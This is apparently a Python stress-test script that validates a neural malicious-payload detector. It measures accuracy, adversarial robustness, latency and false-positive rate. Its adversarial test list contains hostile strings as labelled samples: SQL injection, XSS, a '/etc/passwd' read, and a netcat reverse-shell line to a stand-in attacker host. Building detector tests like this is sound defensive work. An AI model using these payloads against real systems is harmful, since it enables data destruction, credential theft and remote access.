#!/usr/bin/env python3
"""
Stress test and validation script (30-60 minutes).
Runs after training to validate model performance.
"""
import sys
import json
import time
import random
from pathlib import Path
from datetime import datetime
from typing import Dict, List
from dataclasses import dataclass, asdict

import torch
import torch.nn.functional as F
from tqdm import tqdm

sys.path.insert(0, str(Path(__file__).parent.parent))


@dataclass
class TestResult:
    name: str
    passed: bool
    metric: float
    threshold: float
    details: str = ""


@dataclass
class StressTestReport:
    timestamp: str
    overall_passed: bool
    accuracy: float
    precision: float
    recall: float
    f1: float
    fp_rate: float
    fn_rate: float
    inference_latency_ms: float
    throughput_per_sec: float
    tests: List[Dict]


class StressTest:
    """Comprehensive stress testing for trained models."""
    
    def __init__(self, model_dir: Path, data_dir: Path, output_dir: Path):
        self.model_dir = Path(model_dir)
        self.data_dir = Path(data_dir)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        self.device = 'cuda' if torch.cuda.is_available() else 'cpu'
        self.model = None
        self.results: List[TestResult] = []
    
    def load_model(self, model_name: str = 'payload_cnn'):
        """Load trained model."""
        # Try TorchScript first
        pt_path = self.model_dir / f"{model_name}.pt"
        pth_path = self.model_dir / f"{model_name}.pth"
        
        if pt_path.exists():
            self.model = torch.jit.load(str(pt_path), map_location=self.device)
        elif pth_path.exists():
            from src.torch_models.payload_cnn import PayloadCNN
            self.model = PayloadCNN()
            self.model.load_state_dict(torch.load(pth_path, map_location=self.device))
            self.model = self.model.to(self.device)
        else:
            raise FileNotFoundError(f"Model not found: {model_name}")
        
        self.model.eval()
        print(f"Loaded model: {model_name}")
    
    def tokenize(self, text: str, max_len: int = 500) -> torch.Tensor:
        """Tokenize text to tensor."""
        chars = [ord(c) % 256 for c in text[:max_len]]
        chars += [0] * (max_len - len(chars))
        return torch.tensor([chars], dtype=torch.long, device=self.device)
    
    @torch.no_grad()
    def predict(self, text: str) -> float:
        """Get prediction probability."""
        x = self.tokenize(text)
        logits = self.model(x)
        return torch.sigmoid(logits).item()
    
    @torch.no_grad()
    def predict_batch(self, texts: List[str]) -> List[float]:
        """Batch prediction."""
        tokens = []
        for t in texts:
            chars = [ord(c) % 256 for c in t[:500]]
            chars += [0] * (500 - len(chars))
            tokens.append(chars)
        
        x = torch.tensor(tokens, dtype=torch.long, device=self.device)
        logits = self.model(x)
        return torch.sigmoid(logits).cpu().tolist()
    
    def run_quick_validation(self, samples: int = 10000) -> Dict:
        """Phase 1: Quick validation on holdout set."""
        print("\n[Phase 1] Quick Validation...")
        
        holdout_path = self.data_dir / 'holdout_test' / 'holdout_test.jsonl'
        if not holdout_path.exists():
            print(f"Warning: {holdout_path} not found")
            return {'accuracy': 0, 'precision': 0, 'recall': 0, 'f1': 0}
        
        tp = fp = tn = fn = 0
        
        with open(holdout_path, 'r') as f:
            lines = f.readlines()
            random.shuffle(lines)
            
            for line in tqdm(lines[:samples], desc="Validating"):
                data = json.loads(line)
                text = data.get('text', data.get('payload', ''))
                label = int(data.get('label', data.get('is_malicious', 0)))
                
                prob = self.predict(text)
                pred = 1 if prob > 0.5 else 0
                
                if pred == 1 and label == 1:
                    tp += 1
                elif pred == 1 and label == 0:
                    fp += 1
                elif pred == 0 and label == 0:
                    tn += 1
                else:
                    fn += 1
        
        accuracy = (tp + tn) / max(tp + tn + fp + fn, 1)
        precision = tp / max(tp + fp, 1)
        recall = tp / max(tp + fn, 1)
        f1 = 2 * precision * recall / max(precision + recall, 1e-6)
        
        self.results.append(TestResult(
            "accuracy", accuracy >= 0.98, accuracy, 0.98,
            f"TP={tp}, FP={fp}, TN={tn}, FN={fn}"
        ))
        
        return {'accuracy': accuracy, 'precision': precision, 'recall': recall, 'f1': f1}
    
    def run_adversarial_tests(self) -> Dict:
        """Phase 2: Adversarial testing."""
        print("\n[Phase 2] Adversarial Testing...")
        
        # Test cases: (input, expected_malicious, description)
        adversarial_cases = [
            # Should detect (malicious)
            ("' OR '1'='1", True, "SQL injection basic"),
            ("'; DROP TABLE users;--", True, "SQL injection drop"),
            ("<script>alert('xss')</script>", True, "XSS basic"),
            ("<img src=x onerror=alert(1)>", True, "XSS img tag"),
            ("; cat /etc/passwd", True, "Command injection"),
            ("| nc attacker.com 4444", True, "Reverse shell"),
            ("{{7*7}}", True, "Template injection"),
            
            # Obfuscated (should still detect)
            ("' oR '1'='1", True, "SQL case variation"),
            ("%27%20OR%20%271%27%3D%271", True, "SQL URL encoded"),
            ("<ScRiPt>alert(1)</ScRiPt>", True, "XSS case variation"),
            
            # Should NOT detect (benign)
            ("SELECT * FROM users WHERE id = 1", False, "Legit SQL"),
            ("Hello, how are you?", False, "Normal text"),
            ("https://google.com/search?q=test", False, "Normal URL"),
            ("def hello(): return 'world'", False, "Python code"),
            ("The script was great!", False, "Word 'script' in text"),
        ]
        
        passed = 0
        failed = []
        
        for text, expected_mal, desc in tqdm(adversarial_cases, desc="Adversarial"):
            prob = self.predict(text)
            pred_mal = prob > 0.5
            
            if pred_mal == expected_mal:
                passed += 1
            else:
                failed.append({
                    'input': text[:50],
                    'expected': expected_mal,
                    'predicted': pred_mal,
                    'confidence': prob,
                    'description': desc
                })
        
        pass_rate = passed / len(adversarial_cases)
        
        self.results.append(TestResult(
            "adversarial", pass_rate >= 0.85, pass_rate, 0.85,
            f"Passed {passed}/{len(adversarial_cases)}"
        ))
        
        return {'pass_rate': pass_rate, 'failed': failed}
    
    def run_performance_benchmark(self, iterations: int = 100) -> Dict:
        """Phase 3: Performance benchmarking."""
        print("\n[Phase 3] Performance Benchmark...")
        
        test_input = "SELECT * FROM users WHERE id = 1 OR 1=1"
        
        # Single inference latency
        latencies = []
        for _ in tqdm(range(iterations), desc="Latency test"):
            start = time.perf_counter()
            self.predict(test_input)
            latencies.append((time.perf_counter() - start) * 1000)
        
        avg_latency = sum(latencies) / len(latencies)
        
        # Batch throughput
        batch_size = 512
        batch = [test_input] * batch_size
        
        start = time.perf_counter()
        for _ in range(10):
            self.predict_batch(batch)
        elapsed = time.perf_counter() - start
        
        throughput = (batch_size * 10) / elapsed
        
        self.results.append(TestResult(
            "latency", avg_latency < 100, avg_latency, 100,
            f"Avg: {avg_latency:.2f}ms"
        ))
        
        self.results.append(TestResult(
            "throughput", throughput > 5000, throughput, 5000,
            f"{throughput:.0f} samples/sec"
        ))
        
        return {'latency_ms': avg_latency, 'throughput': throughput}
    
    def run_fp_analysis(self, samples: int = 50000) -> Dict:
        """Phase 4: False positive analysis on benign data."""
        print("\n[Phase 4] False Positive Analysis...")
        
        benign_dirs = [
            self.data_dir / 'benign_60m',
            self.data_dir / 'curated_benign',
        ]
        
        benign_files = []
        for d in benign_dirs:
            if d.exists():
                benign_files.extend(d.glob('*.jsonl'))
        
        if not benign_files:
            print("No benign files found")
            return {'fp_rate': 0, 'fp_samples': []}
        
        fp_count = 0
        total = 0
        fp_samples = []
        
        for f in benign_files:
            with open(f, 'r') as file:
                for line in file:
                    if total >= samples:
                        break
                    
                    try:
                        data = json.loads(line)
                        text = data.get('text', '')
                        prob = self.predict(text)
                        
                        if prob > 0.5:
                            fp_count += 1
                            if len(fp_samples) < 100:
                                fp_samples.append({
                                    'text': text[:100],
                                    'confidence': prob
                                })
                        
                        total += 1
                    except:
                        continue
            
            if total >= samples:
                break
        
        fp_rate = fp_count / max(total, 1)
        
        self.results.append(TestResult(
            "fp_rate", fp_rate < 0.03, fp_rate, 0.03,
            f"{fp_count}/{total} false positives"
        ))
        
        return {'fp_rate': fp_rate, 'fp_samples': fp_samples}
    
    def generate_report(self, metrics: Dict) -> StressTestReport:
        """Phase 5: Generate report."""
        print("\n[Phase 5] Generating Report...")
        
        overall_passed = all(r.passed for r in self.results)
        
        report = StressTestReport(
            timestamp=datetime.now().isoformat(),
            overall_passed=overall_passed,
            accuracy=metrics.get('accuracy', 0),
            precision=metrics.get('precision', 0),
            recall=metrics.get('recall', 0),
            f1=metrics.get('f1', 0),
            fp_rate=metrics.get('fp_rate', 0),
            fn_rate=1 - metrics.get('recall', 1),
            inference_latency_ms=metrics.get('latency_ms', 0),
            throughput_per_sec=metrics.get('throughput', 0),
            tests=[asdict(r) for r in self.results]
        )
        
        # Save report
        report_path = self.output_dir / f"stress_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_path, 'w') as f:
            json.dump(asdict(report), f, indent=2)
        
        print(f"\nReport saved: {report_path}")
        
        return report
    
    def run_all(self):
        """Run complete stress test suite."""
        print("=" * 60)
        print("STRESS TEST SUITE")
        print("=" * 60)
        
        start = time.time()
        
        # Load model
        self.load_model('payload_cnn')
        
        # Run all phases
        val_metrics = self.run_quick_validation()
        adv_results = self.run_adversarial_tests()
        perf_metrics = self.run_performance_benchmark()
        fp_results = self.run_fp_analysis()
        
        # Combine metrics
        all_metrics = {
            **val_metrics,
            **perf_metrics,
            'fp_rate': fp_results['fp_rate']
        }
        
        # Generate report
        report = self.generate_report(all_metrics)
        
        # Print summary
        elapsed = time.time() - start
        print("\n" + "=" * 60)
        print("STRESS TEST COMPLETE")
        print("=" * 60)
        print(f"Time: {elapsed/60:.1f} minutes")
        print(f"Overall: {'PASSED ✓' if report.overall_passed else 'FAILED ✗'}")
        print(f"Accuracy: {report.accuracy:.2%}")
        print(f"F1 Score: {report.f1:.2%}")
        print(f"FP Rate: {report.fp_rate:.2%}")
        print(f"Latency: {report.inference_latency_ms:.1f}ms")
        print(f"Throughput: {report.throughput_per_sec:.0f}/sec")
        
        for r in self.results:
            status = "✓" if r.passed else "✗"
            print(f"  {status} {r.name}: {r.metric:.4f} (threshold: {r.threshold})")
        
        return report


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Run stress tests')
    parser.add_argument('--model-dir', default='models')
    parser.add_argument('--data-dir', default='datasets')
    parser.add_argument('--output-dir', default='reports')
    args = parser.parse_args()
    
    tester = StressTest(
        Path(args.model_dir),
        Path(args.data_dir),
        Path(args.output_dir)
    )
    tester.run_all()


if __name__ == '__main__':
    main()
